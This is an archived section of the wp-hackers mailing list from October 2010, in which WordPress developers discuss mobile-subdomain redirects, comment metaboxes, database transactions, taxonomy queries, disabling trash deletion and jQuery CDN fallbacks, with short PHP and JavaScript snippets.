*www.example.com
m.**example**.com*

Both point to the same Wordpress installation. The "m." version is the
stripped down version for mobile phones... this is the same mobile site
naming convention that is used on Facebook and a number of other popular
websites.

Wordpress was redirecting all single posts (is_single() == true) to the
"www." version of the site when browsing the mobile site.

The problem was in wp_includes/canonical.php. I fixed it by adding the
following 3 lines of code at line 344 (Wordpress 3.0.1). If the requested
URL is on the "m." version of the site and it thinks it wants to redirect to
"www.", replace "www." with "m." so it stays on the same version of the
site.

*// if they came in on the mobile version of the site (eg. m.example.com),
stay on the mobile site*
*if ((strncasecmp( $requested_url, 'http://m.', 9) == 0) && (strncasecmp(
$redirect_url, 'http://www.', 11) == 0))*
*    $redirect_url = "http://m.".substr( $redirect_url, 11);*

It would be great if someone could integrate this change into the Wordpress
codebase, as I don't have that ability myself. I have also attached the
modified version of the file.

Please note that if you're testing this code, Wordpress has a habit of
including the full domain name in all URLs, so you will need to strip off
the domain name in order to make your site work on alternate subdomains. You
can do so by sending your site output through a function such as the
following:

*function CleanURLs( $input)*
*{*
*    // remove our host name from URLs*
*    return str_replace("http://www.**example**.com/", "/", $input);*
*}*

Thanks!

Johnathan

From mail at scribu.net  Sun Oct  3 22:41:25 2010
From: mail at scribu.net (scribu)
Date: Mon, 4 Oct 2010 01:41:25 +0300
Subject: [wp-hackers] Fixed issue with mobile site compatibility
In-Reply-To: <AANLkTimEYMsUeE7DJ439CwFR41D=F62btAfotTGhVnu_@mail.gmail.com>
References: <AANLkTimEYMsUeE7DJ439CwFR41D=F62btAfotTGhVnu_@mail.gmail.com>
Message-ID: <AANLkTikBfFrAp1aGSznh9hQGOgLL+9gg0uqmvMLQFu=P@mail.gmail.com>

Hello,

Firstly, next time you have a fix, a better way to submit it for inclusion
is by going directly to trac <http://core.trac.wordpress.org/> and opening a
ticket. I don't think this particular change would make it in though,
because it depends on several other things to be useful.

Secondly, you can use the 'redirect_canonical' filter to achieve the same
effect, without having to modify Core.

From rbilesky at gmail.com  Mon Oct  4 03:22:42 2010
From: rbilesky at gmail.com (Ryan Bilesky)
Date: Sun, 3 Oct 2010 20:22:42 -0700
Subject: [wp-hackers] add metabox to comments
In-Reply-To: <AANLkTi=eL6+BkH_97z-OsAg8+MzoDnvVgZnmaitQXAFe@mail.gmail.com>
References: <AANLkTinGod1nkEhph8DSaYMq=8u04SRLxVbwNZkhrT9t@mail.gmail.com>
	<AANLkTimKue4qwmUmWx70UAkfGu4j6W3xFcv+rrjPbtvh@mail.gmail.com>
	<AANLkTim45P951fyL03Tt6-xpWYMd0O7kW1u=bO8f79b6@mail.gmail.com>
	<AANLkTi=eL6+BkH_97z-OsAg8+MzoDnvVgZnmaitQXAFe@mail.gmail.com>
Message-ID: <AANLkTi=yBmquyGaU_rL3afoXdUT5mXB5Xa-1zh9_Wzr+@mail.gmail.com>

So i finished the plugin I was working on but I cannot get the comment
metabox to work, this is what I am using

add_meta_box('', 'Flags', 'flagcommentmetabox', 'comment' );

But no metabox is displayed when i goto edit comments.
On Fri, Sep 17, 2010 at 11:07 AM, scribu <scribu at gmail.com> wrote:

> On Fri, Sep 17, 2010 at 8:06 PM, Ryan Bilesky <rbilesky at gmail.com> wrote:
>
> > That should be easy then.  Wish they would keep the codex up to date, it
> > said that only works with the Write Post, Write Page, and Write Link
> > editing
> > pages.
> >
>
> "They" is all of us. So, as a thank you for my answer, please update the
> Codex.
>
> You know, the gift that keeps on giving, etc.
>
>
> --
>  http://scribu.net
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>

From wordpress at santosj.name  Mon Oct  4 15:24:11 2010
From: wordpress at santosj.name (Jacob Santos)
Date: Mon, 4 Oct 2010 10:24:11 -0500
Subject: [wp-hackers] Implementing databse transaction in Wordpress
In-Reply-To: <AANLkTi=Rr9BGhPmF2MxCuiM36Xu5SROBxz1V6pTXexs1@mail.gmail.com>
References: <AANLkTindBfnkhf5m4CfsS35e2i2bT8CpS8WFTLHGGTjF@mail.gmail.com>
	<0E444D73-B17D-43AB-A82C-0918D5A9EBE9@ftwr.co.uk>
	<AANLkTinOT_R1pMeD+PbaWqK2a-nOzxGSrnCFVm2umWhu@mail.gmail.com>
	<AANLkTi=Rr9BGhPmF2MxCuiM36Xu5SROBxz1V6pTXexs1@mail.gmail.com>
Message-ID: <AANLkTik_ETuFt8q-SX-8UyxqdGYbPh-K4MqS9FoB86U2@mail.gmail.com>

The MySQL extension does not support transactions, you would either have to:

1. Implement a poor man's transaction support into wpdb by executing the SQL
to start the transaction and stop the transaction manually, which may not
always work and may trigger an error if the table does not support
transactions and the server is not configured to ignore if not supported for
table type.

2. Switch to the mysqli extension (this is fairly simple process, just
change mysql_ to mysqli_ and modify for few differences, where required).
The mysqli extensions handles whether or not transactions are required, so
if the table type does not support transactions, it won't blow up in your
face.

3. Switch to PDO, which is a more involved rewrite of the wpdb class.


On Sat, Oct 2, 2010 at 9:55 AM, Chris Klosowski <chris at chriskdesigns.com>wrote:

> I make it standard practice to run repairs on my data bases via a cron...


I take the prayer approach. I pray every that my data integrity is intact
and so far it has been working perfectly. I have no reason to believe that
prayer won't continue to work in the future. There was that one time... but
that probably the fault of something evil instead.

Jacob Santos

From artur at design2dev.com  Mon Oct  4 16:06:30 2010
From: artur at design2dev.com (artur)
Date: Mon, 4 Oct 2010 13:06:30 -0300
Subject: [wp-hackers] Migrating WP3 SubDomain -> New Domain/Install
Message-ID: <AANLkTi==pOXNzhbGT2viPTqysswPTFwQeraJ5pQso9j=@mail.gmail.com>

Hello List!

New guy here..im about to start doing a lot of work with WP 3 MultiSite..
and would love your advice on migrating a subDomain site to another server.

is there a magic script?
or a tutorial you can point me to?

thank you!

artur | ceo
www.design2dev.com

From matt.thiessen at sourcemedia.net  Mon Oct  4 16:46:08 2010
From: matt.thiessen at sourcemedia.net (Matt Thiessen)
Date: Mon, 4 Oct 2010 09:46:08 -0700
Subject: [wp-hackers] Migrating WP3 SubDomain -> New Domain/Install
In-Reply-To: <AANLkTi==pOXNzhbGT2viPTqysswPTFwQeraJ5pQso9j=@mail.gmail.com>
References: <AANLkTi==pOXNzhbGT2viPTqysswPTFwQeraJ5pQso9j=@mail.gmail.com>
Message-ID: <B14B71530975B14D974F851D24364CF80B00476E@VA3DIAXVS391.RED001.local>

Moved my MU sites to a development env last week and this worked for me.

http://www.cyprich.com/2008/01/05/transferring-wordpress-mu-to-another-server/
________________________________________
From: wp-hackers-bounces at lists.automattic.com [wp-hackers-bounces at lists.automattic.com] On Behalf Of artur [artur at design2dev.com]
Sent: Monday, October 04, 2010 11:06 AM
To: wp-hackers at lists.automattic.com
Subject: [wp-hackers] Migrating WP3 SubDomain -> New Domain/Install

Hello List!

New guy here..im about to start doing a lot of work with WP 3 MultiSite..
and would love your advice on migrating a subDomain site to another server.

is there a magic script?
or a tutorial you can point me to?

thank you!

artur | ceo
www.design2dev.com
_______________________________________________
wp-hackers mailing list
wp-hackers at lists.automattic.com
http://lists.automattic.com/mailman/listinfo/wp-hackers



From curtis at curtismchale.ca  Mon Oct  4 17:22:57 2010
From: curtis at curtismchale.ca (Curtis McHale)
Date: Mon, 04 Oct 2010 10:22:57 -0700
Subject: [wp-hackers] Query for Multiple Custom Taxonomies
Message-ID: <4CAA0D71.3030102@curtismchale.ca>

Use Case:

Music site with 'genre' as a hierarchical taxonomy. Each show may have 
multiple genres associated with it.

Currently query_posts(); doesn't support putting multiple slugs into the 
query so I could grab shows of the same genre that the user might be 
interested in. Looking around you have to query the database directly.

There should be a query parameter of $taxonomy_id that lets you put 
multiple ids into the query just like cat_id does.

I looked around on Trac and didn't see a ticket but I may have missed 
it. Is there a ticket for this already? Is there support for this 
change? Unfortunately I probably can't provide the code though I'm happy 
to test it.
-- 
Curtis McHale

604.751.3482
http://curtismchale.ca
http://twitter.com/curtismchale
http://ca.linkedin.com/in/curtismchale


From mail at scribu.net  Mon Oct  4 17:24:55 2010
From: mail at scribu.net (scribu)
Date: Mon, 4 Oct 2010 20:24:55 +0300
Subject: [wp-hackers] Query for Multiple Custom Taxonomies
In-Reply-To: <4CAA0D71.3030102@curtismchale.ca>
References: <4CAA0D71.3030102@curtismchale.ca>
Message-ID: <AANLkTim1tbCyxW61QMG86-FYRm7Xy9=CYpVSC1y1d+FM@mail.gmail.com>

On Mon, Oct 4, 2010 at 8:22 PM, Curtis McHale <curtis at curtismchale.ca>wrote:

> I looked around on Trac and didn't see a ticket but I may have missed it.
> Is there a ticket for this already? Is there support for this change?
> Unfortunately I probably can't provide the code though I'm happy to test it.
>

Here it is: http://core.trac.wordpress.org/ticket/12891

From mail at scribu.net  Mon Oct  4 17:28:51 2010
From: mail at scribu.net (scribu)
Date: Mon, 4 Oct 2010 20:28:51 +0300
Subject: [wp-hackers] Implementing databse transaction in Wordpress
In-Reply-To: <AANLkTik_ETuFt8q-SX-8UyxqdGYbPh-K4MqS9FoB86U2@mail.gmail.com>
References: <AANLkTindBfnkhf5m4CfsS35e2i2bT8CpS8WFTLHGGTjF@mail.gmail.com>
	<0E444D73-B17D-43AB-A82C-0918D5A9EBE9@ftwr.co.uk>
	<AANLkTinOT_R1pMeD+PbaWqK2a-nOzxGSrnCFVm2umWhu@mail.gmail.com>
	<AANLkTi=Rr9BGhPmF2MxCuiM36Xu5SROBxz1V6pTXexs1@mail.gmail.com>
	<AANLkTik_ETuFt8q-SX-8UyxqdGYbPh-K4MqS9FoB86U2@mail.gmail.com>
Message-ID: <AANLkTimskQmdcEYtexomGJKK-Kic-7mdCix1wkSotnzZ@mail.gmail.com>

On Mon, Oct 4, 2010 at 6:24 PM, Jacob Santos <wordpress at santosj.name> wrote:

> On Sat, Oct 2, 2010 at 9:55 AM, Chris Klosowski <chris at chriskdesigns.com
> >wrote:
>
> > I make it standard practice to run repairs on my data bases via a cron...
>
>
> I take the prayer approach. I pray every that my data integrity is intact
> and so far it has been working perfectly. I have no reason to believe that
> prayer won't continue to work in the future. There was that one time... but
> that probably the fault of something evil instead.
>

LOL

From curtis at curtismchale.ca  Mon Oct  4 17:30:09 2010
From: curtis at curtismchale.ca (Curtis McHale)
Date: Mon, 04 Oct 2010 10:30:09 -0700
Subject: [wp-hackers] Query for Multiple Custom Taxonomies
In-Reply-To: <AANLkTim1tbCyxW61QMG86-FYRm7Xy9=CYpVSC1y1d+FM@mail.gmail.com>
References: <4CAA0D71.3030102@curtismchale.ca>
	<AANLkTim1tbCyxW61QMG86-FYRm7Xy9=CYpVSC1y1d+FM@mail.gmail.com>
Message-ID: <4CAA0F21.3090907@curtismchale.ca>

Thanks.

scribu wrote:
> On Mon, Oct 4, 2010 at 8:22 PM, Curtis McHale<curtis at curtismchale.ca>wrote:
>
>> I looked around on Trac and didn't see a ticket but I may have missed it.
>> Is there a ticket for this already? Is there support for this change?
>> Unfortunately I probably can't provide the code though I'm happy to test it.
>>
>
> Here it is: http://core.trac.wordpress.org/ticket/12891
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers

-- 
Curtis McHale

604.751.3482
http://curtismchale.ca
http://twitter.com/curtismchale
http://ca.linkedin.com/in/curtismchale


From artur at design2dev.com  Mon Oct  4 17:34:20 2010
From: artur at design2dev.com (artur)
Date: Mon, 4 Oct 2010 14:34:20 -0300
Subject: [wp-hackers] Migrating WP3 SubDomain -> New Domain/Install
In-Reply-To: <B14B71530975B14D974F851D24364CF80B00476E@VA3DIAXVS391.RED001.local>
References: <AANLkTi==pOXNzhbGT2viPTqysswPTFwQeraJ5pQso9j=@mail.gmail.com>
	<B14B71530975B14D974F851D24364CF80B00476E@VA3DIAXVS391.RED001.local>
Message-ID: <AANLkTinpaMaqE2eRhZu_270jD2BMHSYVAzOSuE=W8tSq@mail.gmail.com>

this seems to be about migrating WP MU blogs.
im assuming that this process is a bit different with vrsn3 Multisite?
or am i wrong here?

thanks

On Mon, Oct 4, 2010 at 1:46 PM, Matt Thiessen <matt.thiessen at sourcemedia.net
> wrote:

> Moved my MU sites to a development env last week and this worked for me.
>
>
> http://www.cyprich.com/2008/01/05/transferring-wordpress-mu-to-another-server/
> ________________________________________
> From: wp-hackers-bounces at lists.automattic.com [
> wp-hackers-bounces at lists.automattic.com] On Behalf Of artur [
> artur at design2dev.com]
> Sent: Monday, October 04, 2010 11:06 AM
> To: wp-hackers at lists.automattic.com
> Subject: [wp-hackers] Migrating WP3 SubDomain -> New Domain/Install
>
> Hello List!
>
> New guy here..im about to start doing a lot of work with WP 3 MultiSite..
> and would love your advice on migrating a subDomain site to another server.
>
> is there a magic script?
> or a tutorial you can point me to?
>
> thank you!
>
> artur | ceo
> www.design2dev.com
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>
>
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>

From rbilesky at gmail.com  Mon Oct  4 18:21:28 2010
From: rbilesky at gmail.com (Ryan Bilesky)
Date: Mon, 4 Oct 2010 11:21:28 -0700
Subject: [wp-hackers] Never Permanently Delete
Message-ID: <AANLkTinrkguWiLkv6s2Oci9NDPnAaq_ihJwWwxSnXGZV@mail.gmail.com>

I am looking for a way to stop wordpress from emptying the trash every 30
days.  I know I can define a new time frame but I want to completely disable
the ability for trash to be permanently deleted.  I am also looking to
remove the Permanently Delete link for posts and comments.

From wp at andrewnacin.com  Mon Oct  4 19:27:07 2010
From: wp at andrewnacin.com (Andrew Nacin)
Date: Mon, 4 Oct 2010 15:27:07 -0400
Subject: [wp-hackers] Never Permanently Delete
In-Reply-To: <AANLkTinrkguWiLkv6s2Oci9NDPnAaq_ihJwWwxSnXGZV@mail.gmail.com>
References: <AANLkTinrkguWiLkv6s2Oci9NDPnAaq_ihJwWwxSnXGZV@mail.gmail.com>
Message-ID: <AANLkTikhsgH4prYpgYk2R2WiBUo8FG4mUQtGSn_KHtg+@mail.gmail.com>

On Mon, Oct 4, 2010 at 2:21 PM, Ryan Bilesky <rbilesky at gmail.com> wrote:

> I am looking for a way to stop wordpress from emptying the trash every 30
> days.  I know I can define a new time frame but I want to completely
> disable
> the ability for trash to be permanently deleted.  I am also looking to
> remove the Permanently Delete link for posts and comments.


I've done this by placing EMPTY_TRASH_DAYS to an insane number.
Alternatively, you may prevent wp_scheduled_delete() from being scheduled
and fired.

You can also remove all UI action links for the deletion of a post (i.e. so
they do not appear on post_status=trash) but be sure to also force a die()
on pre-deletion hooks.

From bg at hearingvoices.com  Mon Oct  4 19:39:16 2010
From: bg at hearingvoices.com (Barrett Golding)
Date: Mon, 4 Oct 2010 13:39:16 -0600
Subject: [wp-hackers] google jquery; wp fall back?
Message-ID: <DF14B0A0-CC65-4833-974B-B9E771469B4C@hearingvoices.com>

tried asking this in support, but no takers,
so hope it's ok to ask here...

the following is a rewite for WP of the code at: http:// 
html5boilerplate.com/
it grabs Google's CDN vers of jquery, but falls back to a local copy--
for the few times when (and few countries where) Google is unavailable.

<?php wp_enqueue_script( 'jquery' ); ?>
<script type="application/x-javascript">!window.jQuery &&  
document.write('<script src="/wp-includes/js/jquery/jquery.js"><\/ 
script>')</script>

i've de-/re- registered 'jquery' so it gets Google's vers,
and above works fine inserted in <head> (of header.php, for instance):

one slight prob is if above <script> is in footer.php,
the fall back fails. otherwise, all seems to work well.

so, I'm just wondering if anyone has a better solution,
or sees some flaw in mine. thanks.
bg
-- 
<http://HearingVoices.com/>
~radio active transmissions~




From liste at srpski.biz  Mon Oct  4 20:29:35 2010
From: liste at srpski.biz (=?UTF-8?B?TWlsYW4gRGluacSH?=)
Date: Mon, 4 Oct 2010 22:29:35 +0200
Subject: [wp-hackers] google jquery; wp fall back?
In-Reply-To: <DF14B0A0-CC65-4833-974B-B9E771469B4C@hearingvoices.com>
References: <DF14B0A0-CC65-4833-974B-B9E771469B4C@hearingvoices.com>
Message-ID: <AANLkTinHORL+jrKj_T33f6Dz19Sir8rmJOJ__E-wvgew@mail.gmail.com>

For use of Google-hosted jQuery, best and full-featured solution for
WordPress is Use Google Libraries plugin. The only thing that it lacks is
fall back.

You can see how it handles noconflict to maybe get idea how to add fall
back.

2010/10/4 Barrett Golding <bg at hearingvoices.com>

> tried asking this in support, but no takers,
> so hope it's ok to ask here...
>
> the following is a rewite for WP of the code at:
> http://html5boilerplate.com/
> it grabs Google's CDN vers of jquery, but falls back to a local copy--
> for the few times when (and few countries where) Google is unavailable.
>
> <?php wp_enqueue_script( 'jquery' ); ?>
> <script type="application/x-javascript">!window.jQuery &&
> document.write('<script
> src="/wp-includes/js/jquery/jquery.js"><\/script>')</script>
>
> i've de-/re- registered 'jquery' so it gets Google's vers,
> and above works fine inserted in <head> (of header.php, for instance):
>
> one slight prob is if above <script> is in footer.php,
> the fall back fails. otherwise, all seems to work well.
>
> so, I'm just wondering if anyone has a better solution,
> or sees some flaw in mine. thanks.
> bg
> --
> <http://HearingVoices.com/ <http://hearingvoices.com/>>
> ~radio active transmissions~
>
>
>
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>

From ozh at ozh.org  Mon Oct  4 20:51:57 2010
From: ozh at ozh.org (Ozh)
Date: Mon, 4 Oct 2010 22:51:57 +0200
Subject: [wp-hackers] google jquery; wp fall back?
In-Reply-To: <DF14B0A0-CC65-4833-974B-B9E771469B4C@hearingvoices.com>
References: <DF14B0A0-CC65-4833-974B-B9E771469B4C@hearingvoices.com>
Message-ID: <AANLkTim-UjzP1F49UC1LEtpRyf3_NzLkSQ42VtogPmY-@mail.gmail.com>

It's working fine with me (WinXP, FF3.6) either in head or in the footer.

I suspect the jQuery fallback might totally be browser dependent
though, so I definitely would not rely on this and safely include
everything in head

On Mon, Oct 4, 2010 at 9:39 PM, Barrett Golding <bg at hearingvoices.com> wrote:
> one slight prob is if above <script> is in footer.php,
> the fall back fails. otherwise, all seems to work well.

-- 
http://ozh.org/

From ashishsainiashfame at gmail.com  Mon Oct  4 21:16:10 2010
From: ashishsainiashfame at gmail.com (Ashish Saini)
Date: Tue, 5 Oct 2010 02:46:10 +0530
Subject: [wp-hackers] Adjacent post is affected by the query
Message-ID: <AANLkTi=3WmpcYm4wDCS7xi3xr_bFNorC-XuJtd+EqqbA@mail.gmail.com>

Hello,

When I try to execute a query on my own table by fetching the post ID from
the post global, then the same query is in effect on the adjacent post too.
I have seen this thing before but Googling didn't turn up anything. I think
it has something to do with the navigation links (previous and next post).

I am storing post views in a separate table & whenever I increment the
count, the adjacent post's view count is incremented too.

The very same bug (lets call it a bug for now) is in WP-PostViews plugin by
Laster Chan too.

Can you guys point me in some direction in this matter?

Thanks & Regards
Ashish Saini aka Ashfame
(Deserve Before You Desire)
Homepage : http://www.ashfame.com | Blog : http://blog.ashfame.com | Twitter
: http://twitter.com/ashfame

From wp at andrewnacin.com  Mon Oct  4 21:29:04 2010
From: wp at andrewnacin.com (Andrew Nacin)
Date: Mon, 4 Oct 2010 17:29:04 -0400
Subject: [wp-hackers] Adjacent post is affected by the query
In-Reply-To: <AANLkTi=3WmpcYm4wDCS7xi3xr_bFNorC-XuJtd+EqqbA@mail.gmail.com>
References: <AANLkTi=3WmpcYm4wDCS7xi3xr_bFNorC-XuJtd+EqqbA@mail.gmail.com>
Message-ID: <AANLkTi=pxqWyYD1caWf6Gc6qwA1LGSq059GiS1aL07rO@mail.gmail.com>

On Mon, Oct 4, 2010 at 5:16 PM, Ashish Saini
<ashishsainiashfame at gmail.com>wrote:

> Hello,
>
> When I try to execute a query on my own table by fetching the post ID from
> the post global, then the same query is in effect on the adjacent post too.
> I have seen this thing before but Googling didn't turn up anything. I think
> it has something to do with the navigation links (previous and next post).


It's your browser prefetching the next post.

http://core.trac.wordpress.org/ticket/12603

From mikeschinkel at newclarity.net  Mon Oct  4 22:01:47 2010
From: mikeschinkel at newclarity.net (Mike Schinkel)
Date: Mon, 4 Oct 2010 18:01:47 -0400
Subject: [wp-hackers] Query for Multiple Custom Taxonomies
In-Reply-To: <4CAA0D71.3030102@curtismchale.ca>
References: <4CAA0D71.3030102@curtismchale.ca>
Message-ID: <BD4F4A85-A3A1-4F6B-9984-0D294C4B359A@newclarity.net>

On Oct 4, 2010, at 1:22 PM, Curtis McHale wrote:
> Use Case:
> 
> Music site with 'genre' as a hierarchical taxonomy. Each show may have multiple genres associated with it.
> 
> Currently query_posts(); doesn't support putting multiple slugs into the query so I could grab shows of the same genre that the user might be interested in. Looking around you have to query the database directly.
> 
> There should be a query parameter of $taxonomy_id that lets you put multiple ids into the query just like cat_id does.

Here's an example [1] showing you how to add a filter on posts_where to support a "tax_terms" parameter in the format of "{$taxonomy1}:{$term1},{$taxonomy2}:{$term2},...{$taxonomyN}:{$termN}", i.e.:

$result = new WP_Query('post_type=show&tax_terms=genre:grunge,genre:alternative');	
foreach($result->posts as $post) {
	echo "{$post->post_title}\n";
}

Hope this helps.

-Mike
[1] http://gist.github.com/610526

From rbilesky at gmail.com  Mon Oct  4 23:49:13 2010
From: rbilesky at gmail.com (Ryan Bilesky)
Date: Mon, 4 Oct 2010 16:49:13 -0700
Subject: [wp-hackers] Never Permanently Delete
In-Reply-To: <AANLkTikhsgH4prYpgYk2R2WiBUo8FG4mUQtGSn_KHtg+@mail.gmail.com>
References: <AANLkTinrkguWiLkv6s2Oci9NDPnAaq_ihJwWwxSnXGZV@mail.gmail.com>
	<AANLkTikhsgH4prYpgYk2R2WiBUo8FG4mUQtGSn_KHtg+@mail.gmail.com>
Message-ID: <AANLkTimCRb4j0p+DMRkZnTypQx6W4YO4FQ7qvcXim7x5@mail.gmail.com>

There doesn;t happen to be a filter for the UI links is there?

On Mon, Oct 4, 2010 at 12:27 PM, Andrew Nacin <wp at andrewnacin.com> wrote:

>  On Mon, Oct 4, 2010 at 2:21 PM, Ryan Bilesky <rbilesky at gmail.com> wrote:
>
> > I am looking for a way to stop wordpress from emptying the trash every 30
> > days.  I know I can define a new time frame but I want to completely
> > disable
> > the ability for trash to be permanently deleted.  I am also looking to
> > remove the Permanently Delete link for posts and comments.
>
>
> I've done this by placing EMPTY_TRASH_DAYS to an insane number.
> Alternatively, you may prevent wp_scheduled_delete() from being scheduled
> and fired.
>
> You can also remove all UI action links for the deletion of a post (i.e. so
> they do not appear on post_status=trash) but be sure to also force a die()
> on pre-deletion hooks.
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>

From wp at andrewnacin.com  Tue Oct  5 00:59:23 2010
From: wp at andrewnacin.com (Andrew Nacin)
Date: Mon, 4 Oct 2010 20:59:23 -0400
Subject: [wp-hackers] Never Permanently Delete
In-Reply-To: <AANLkTimCRb4j0p+DMRkZnTypQx6W4YO4FQ7qvcXim7x5@mail.gmail.com>
References: <AANLkTinrkguWiLkv6s2Oci9NDPnAaq_ihJwWwxSnXGZV@mail.gmail.com>
	<AANLkTikhsgH4prYpgYk2R2WiBUo8FG4mUQtGSn_KHtg+@mail.gmail.com>
	<AANLkTimCRb4j0p+DMRkZnTypQx6W4YO4FQ7qvcXim7x5@mail.gmail.com>
Message-ID: <AANLkTi=4CO2bSYXXygwFk5wXFvqXah0R504N=qzP7f37@mail.gmail.com>

On Mon, Oct 4, 2010 at 7:49 PM, Ryan Bilesky <rbilesky at gmail.com> wrote:

> There doesn;t happen to be a filter for the UI links is there?


Of course. I wouldn't have suggested this if there wasn't. :)

In 3.0, the filter for the post actions is called post_row_actions, for
example. You can find this in wp-admin/includes/template.php.

Hacking core is bad. http://codex.wordpress.org/images/b/b3/donthack.jpg

From bg at hearingvoices.com  Tue Oct  5 02:47:05 2010
From: bg at hearingvoices.com (Barrett Golding)
Date: Mon, 4 Oct 2010 20:47:05 -0600
Subject: [wp-hackers] google jquery; wp fall back?
Message-ID: <B525CD70-3157-40CD-BAF8-41367F04EBE4@hearingvoices.com>

damn, i was wrong. while the following does load the scripts  
sequentially,
so the second won't load if the first does:

<script src="http://ajax.googleapis.com/ajax/libs/jquery/1/ 
jquery.min.js"?</script>
<script>!window.jQuery && document.write('<script src="/head/wp- 
includes/js/jquery/jquery_test.js"><\/script>')</script>

this, however, seems to load 'em both in FF:

<?php wp_enqueue_script( 'jquery' ); ?>
<script>!window.jQuery && document.write('<script src="/head/wp- 
includes/js/jquery/jquery_test.js"><\/script>')</script>

oh, well, back to drawing board.

bg
-- 
<http://HearingVoices.com/>
~radio active transmissions~




From rbilesky at gmail.com  Tue Oct  5 18:53:58 2010
From: rbilesky at gmail.com (Ryan Bilesky)
Date: Tue, 5 Oct 2010 11:53:58 -0700
Subject: [wp-hackers] Never Permanently Delete
In-Reply-To: <AANLkTi=4CO2bSYXXygwFk5wXFvqXah0R504N=qzP7f37@mail.gmail.com>
References: <AANLkTinrkguWiLkv6s2Oci9NDPnAaq_ihJwWwxSnXGZV@mail.gmail.com>
	<AANLkTikhsgH4prYpgYk2R2WiBUo8FG4mUQtGSn_KHtg+@mail.gmail.com>
	<AANLkTimCRb4j0p+DMRkZnTypQx6W4YO4FQ7qvcXim7x5@mail.gmail.com>
	<AANLkTi=4CO2bSYXXygwFk5wXFvqXah0R504N=qzP7f37@mail.gmail.com>
Message-ID: <AANLkTinWojNN65VLCngmzOU4uFxUaTkXxKY9DeRs3u+9@mail.gmail.com>

Ok thanks I'll look into that filter. As far as hacking the core goes I
think I might have to to prevent wp_scheduled_delete() from firing.  It
seems that even if I use wp unschedule event to stop it from running it
appears it will get rescheduled each time wp-admin is accessed.

Besides I though it was every time to hack core an angel gets it wings...lol

And I don't want to just set EMPTY_TRASH_DAYS to a large number because
eventually that day will come and I don't ever want anything permanently
deleted so that's not an option.

On Mon, Oct 4, 2010 at 5:59 PM, Andrew Nacin <wp at andrewnacin.com> wrote:

> On Mon, Oct 4, 2010 at 7:49 PM, Ryan Bilesky <rbilesky at gmail.com> wrote:
>
> > There doesn;t happen to be a filter for the UI links is there?
>
>
> Of course. I wouldn't have suggested this if there wasn't. :)
>
> In 3.0, the filter for the post actions is called post_row_actions, for
> example. You can find this in wp-admin/includes/template.php.
>
> Hacking core is bad. http://codex.wordpress.org/images/b/b3/donthack.jpg
>  _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>

From batmoo at gmail.com  Tue Oct  5 19:04:48 2010
From: batmoo at gmail.com (Mohammad Jangda)
Date: Tue, 5 Oct 2010 15:04:48 -0400
Subject: [wp-hackers] Never Permanently Delete
In-Reply-To: <AANLkTinWojNN65VLCngmzOU4uFxUaTkXxKY9DeRs3u+9@mail.gmail.com>
References: <AANLkTinrkguWiLkv6s2Oci9NDPnAaq_ihJwWwxSnXGZV@mail.gmail.com>
	<AANLkTikhsgH4prYpgYk2R2WiBUo8FG4mUQtGSn_KHtg+@mail.gmail.com>
	<AANLkTimCRb4j0p+DMRkZnTypQx6W4YO4FQ7qvcXim7x5@mail.gmail.com>
	<AANLkTi=4CO2bSYXXygwFk5wXFvqXah0R504N=qzP7f37@mail.gmail.com>
	<AANLkTinWojNN65VLCngmzOU4uFxUaTkXxKY9DeRs3u+9@mail.gmail.com>
Message-ID: <AANLkTinRqj2F2myjB+KvwCoWk57FTdnWRihnNC+8nOWt@mail.gmail.com>

On Tue, Oct 5, 2010 at 2:53 PM, Ryan Bilesky <rbilesky at gmail.com> wrote:

> And I don't want to just set EMPTY_TRASH_DAYS to a large number because
> eventually that day will come and I don't ever want anything permanently
> deleted so that's not an option.
>

*define( 'EMPTY_TRASH_DAYS', 1024768 );*

I think we'll all have been terminated by Skynet by the time that comes
around ;)

From rbilesky at gmail.com  Tue Oct  5 19:41:12 2010
From: rbilesky at gmail.com (Ryan Bilesky)
Date: Tue, 5 Oct 2010 12:41:12 -0700
Subject: [wp-hackers] Never Permanently Delete
In-Reply-To: <AANLkTinRqj2F2myjB+KvwCoWk57FTdnWRihnNC+8nOWt@mail.gmail.com>
References: <AANLkTinrkguWiLkv6s2Oci9NDPnAaq_ihJwWwxSnXGZV@mail.gmail.com>
	<AANLkTikhsgH4prYpgYk2R2WiBUo8FG4mUQtGSn_KHtg+@mail.gmail.com>
	<AANLkTimCRb4j0p+DMRkZnTypQx6W4YO4FQ7qvcXim7x5@mail.gmail.com>
	<AANLkTi=4CO2bSYXXygwFk5wXFvqXah0R504N=qzP7f37@mail.gmail.com>
	<AANLkTinWojNN65VLCngmzOU4uFxUaTkXxKY9DeRs3u+9@mail.gmail.com>
	<AANLkTinRqj2F2myjB+KvwCoWk57FTdnWRihnNC+8nOWt@mail.gmail.com>
Message-ID: <AANLkTim674EBFTq0ptRB336QW2cSE6r-FDyiU1nFjMM5@mail.gmail.com>

or I can just comment out 2 lines in admin.php to prevent the auto delete
from scheduling.  I'm actually kinda surprised I haven't had to hack core
yet with all the changes I am making to my wordpress install.

On Tue, Oct 5, 2010 at 12:04 PM, Mohammad Jangda <batmoo at gmail.com> wrote:

> On Tue, Oct 5, 2010 at 2:53 PM, Ryan Bilesky <rbilesky at gmail.com> wrote:
>
> > And I don't want to just set EMPTY_TRASH_DAYS to a large number because
> > eventually that day will come and I don't ever want anything permanently
> > deleted so that's not an option.
> >
>
> *define( 'EMPTY_TRASH_DAYS', 1024768 );*
>
> I think we'll all have been terminated by Skynet by the time that comes
> around ;)
>  _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>

From wp at andrewnacin.com  Tue Oct  5 20:23:55 2010
From: wp at andrewnacin.com (Andrew Nacin)
